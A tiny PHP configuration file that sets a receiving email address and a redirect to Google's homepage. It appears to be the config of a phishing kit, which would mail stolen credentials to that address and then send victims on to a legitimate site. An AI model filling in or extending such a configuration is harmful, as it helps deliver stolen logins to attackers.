<?php 
$Receive_email="mtzbaleruspoland@gmail.com";
$redirect="https://www.google.com/";
?>